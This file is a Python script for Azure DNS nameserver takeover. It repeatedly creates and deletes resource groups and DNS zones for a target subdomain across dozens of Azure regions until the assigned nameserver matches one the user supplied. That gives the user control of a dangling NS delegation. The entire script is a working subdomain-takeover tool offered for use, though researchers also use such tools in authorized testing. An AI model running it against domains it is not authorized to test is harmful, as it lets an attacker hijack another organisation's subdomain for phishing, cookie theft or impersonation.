import json
import random
import sys
import subprocess

Green        = "\033[32m"
Default      = '\033[0m'
Red          = '\033[91m'

available_rg = ['australiacentral','australiacentral2','australiaeast','australiasoutheast','brazilsouth','brazilsoutheast','canadacentral','canadaeast','centralindia','centralus','centraluseuap','eastasia','eastus','eastus2','eastus2euap','francecentral','francesouth','germanynorth','germanywestcentral','japaneast','japanwest','koreacentral','koreasouth','northcentralus','northeurope','norwayeast','norwaywest','qatarcentral','southafricanorth','southafricawest','southcentralus','southeastasia','southindia','swedencentral','swedensouth','switzerlandnorth','switzerlandwest','uaecentral','uaenorth','uksouth','ukwest','westcentralus','westeurope','westindia','westus','westus2','westus3','asia','asiapacific','australia','brazil','canada','devfabric','europe','global','india','japan','northwestus','uk','france','germany','switzerland','korea','norway','uae','southafrica','unitedstates','unitedstateseuap','westuspartner','singapore','eastusslv','israelcentral','italynorth','malaysiasouth','polandcentral','taiwannorth','taiwannorthwest']

randomness = random.randint(0000,9999)
n = len(sys.argv)
if n <= 2:
    print(f"{Red}Error! Correct arguments not provided{Default} \nExample: python3 aznstakeover.py vulnerable.example.com 02")
    exit(1)

if subprocess.run('az',stderr=subprocess.DEVNULL,stdout=subprocess.DEVNULL,shell=True).returncode != 0:
    print(f"{Red}az cli not installed{Default}")
    print(f"Refer to https://learn.microsoft.com/en-us/cli/azure/install-azure-cli ")
    exit(1)

az_logged_in_check = subprocess.run('az account show',stderr=subprocess.DEVNULL,stdout=subprocess.DEVNULL,shell=True)
if az_logged_in_check.returncode != 0:
    print(f"{Red}az cli not logged in{Default}")
    print("Use command: az login ")
    exit(1)

subdomain = sys.argv[1]
tomatch = []

for i in range(2, n):
     tomatch.append(sys.argv[i])

for region in available_rg:
    print(f'Creating {region}_group_{randomness} ')
    subprocess.run(f''' az group create -l {region} -n {region}_group_{randomness} --output none''' ,stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,shell=True)
    print(f'Creating DNS Zone file in {region}_group_{randomness} ')
    output = subprocess.run(f''' az network dns zone create --name {subdomain} --resource-group {region}_group_{randomness} ''',stdout=subprocess.PIPE,shell=True)
    try:
        out_json = json.loads(output.stdout.decode('utf-8'))
        obtained_ns = out_json['nameServers'][0].split('-')[1].split('.')[0]
        print("Obtained NS : " + obtained_ns)
        if obtained_ns in tomatch:
            print(f'{Green}Match found in {region}_group_{randomness}{Default}')
            exit()
        print("Not matched")
    except json.decoder.JSONDecodeError:
        pass
    except KeyboardInterrupt:
        print('Ctl-C was pressed')
        exit()
    print(f'Deleting {region}_group_{randomness} ')
    subprocess.run(f''' az group delete -n {region}_group_{randomness} --no-wait --yes ''',stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,shell = True)

print('Not able to obtain matching NS')

